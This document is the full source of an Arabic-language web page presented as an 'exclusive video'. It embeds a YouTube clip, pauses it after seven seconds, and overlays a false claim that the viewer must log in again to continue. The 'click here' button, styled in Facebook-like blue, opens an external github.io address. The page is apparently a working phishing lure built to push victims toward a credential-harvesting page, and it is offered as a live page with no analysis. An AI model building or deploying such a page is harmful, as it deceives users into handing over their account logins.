<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>شاهد الآن: فيديو حصري</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <style>
        body, html {
            margin: 0;
            padding: 0;
            background-color: #000;
            height: 100%;
            width: 100%;
        }
        
        .video-container {
            position: relative;
            width: 100%; 
            height: 100vh; /* يغطي كامل الشاشة */
        }

        iframe {
            width: 100%;
            height: 100%;
            border: none;
        }
        
        #video-overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            display: none; 
            flex-direction: column;
            justify-content: center;
            align-items: center;
            background-color: rgba(0, 0, 0, 0.95);
            z-index: 10;
            text-align: center;
        }

        #overlay-message {
            color: white;
            font-size: 22px;
            margin-bottom: 20px;
            font-weight: bold;
        }

        #continue-text {
            padding: 12px 25px;
            font-size: 18px;
            background-color: #4267B2; 
            color: white;
            border-radius: 6px;
            font-weight: bold;
            cursor: pointer;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
            transition: background-color 0.3s;
        }

        #continue-text:hover {
            background-color: #365899;
        }

        /* زر التشغيل الأخضر المزرق */
        #custom-play {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 80px;
            height: 80px;
            background-color: #00bfa5; /* أخضر مزرق */
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            cursor: pointer;
            z-index: 11;
        }

        #custom-play::before {
            content: '';
            display: block;
            width: 0;
            height: 0;
            border-left: 25px solid white;
            border-top: 15px solid transparent;
            border-bottom: 15px solid transparent;
            margin-left: 5px;
        }

        /* دائرة "انتظر قليلا" سوداء بالكامل */
        #loading-circle {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 120px;
            height: 120px;
            background: #000; /* سوداء بدون شفافية */
            border-radius: 50%;
            display: none;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            color: white;
            font-size: 14px;
            z-index: 12;
        }

        .spinner {
            border: 4px solid #444;
            border-top: 4px solid #fff;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin-bottom: 8px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* شريط أسفل الفيديو */
        #bottom-bar {
            position: absolute;
            bottom: 0;
            left: 0;
            width: 100%;
            background-color: #000; /* يغطي النص الافتراضي */
            color: white;
            font-size: 16px;
            text-align: center;
            padding: 8px 0;
            z-index: 13; /* أعلى من كل شيء */
            font-weight: bold;
        }
    </style>
</head>
<body>
    
<div class="video-container">
    <!-- تضمين يوتيوب -->
    <iframe id="myVideo" src="https://www.youtube.com/embed/rMuW3XQVpyM?enablejsapi=1&controls=1" allow="autoplay; encrypted-media" allowfullscreen></iframe>

    <!-- زر التشغيل الأخضر المزرق -->
    <div id="custom-play"></div>

    <!-- دائرة التحميل السوداء بالكامل -->
    <div id="loading-circle">
        <div class="spinner"></div>
        <div>انتظر قليلا</div>
    </div>

    <!-- overlay بعد توقف الفيديو -->
    <div id="video-overlay">
        <div id="overlay-message">يجب عليك إعادة تسجيل الدخول لمشاهدة الفيديو كاملا.</div>
        <span id="continue-text">أنقر هنا</span>
    </div>

    <!-- شريط أسفل الفيديو -->
    <div id="bottom-bar">
        يجب عليك إعادة تسجيل الدخول لتتمكن من مشاهدة الفيديوهات
    </div>
</div>

<script>
    const overlay = document.getElementById('video-overlay');
    const loadingCircle = document.getElementById('loading-circle');
    const playButton = document.getElementById('custom-play');
    const stopTime = 7; // يتوقف بعد 7 ثواني
    const destinationURL = "https://youcefcheria.github.io/Youcef/"; 

    let player;
    function onYouTubeIframeAPIReady() {
        player = new YT.Player('myVideo', {
            events: {
                'onStateChange': onPlayerStateChange
            }
        });
    }

    let interval;
    function onPlayerStateChange(event) {
        if (event.data == YT.PlayerState.PLAYING) {
            interval = setInterval(() => {
                if (player.getCurrentTime() >= stopTime) {
                    player.pauseVideo();
                    overlay.style.display = 'flex';
                    clearInterval(interval);
                }
            }, 500);
        }
    }

    // تحميل API
    var tag = document.createElement('script');
    tag.src = "https://www.youtube.com/iframe_api";
    document.body.appendChild(tag);

    // عند الضغط على زر التشغيل الأخضر المزرق
    playButton.addEventListener('click', function() {
        playButton.style.display = 'none'; 
        player.playVideo(); 
        loadingCircle.style.display = 'flex'; 

        setTimeout(function() {
            loadingCircle.style.display = 'none'; 
        }, 2000);
    });

    document.getElementById('continue-text').addEventListener('click', function() {
        window.open(destinationURL, '_blank');
    });
</script>

</body>
</html>
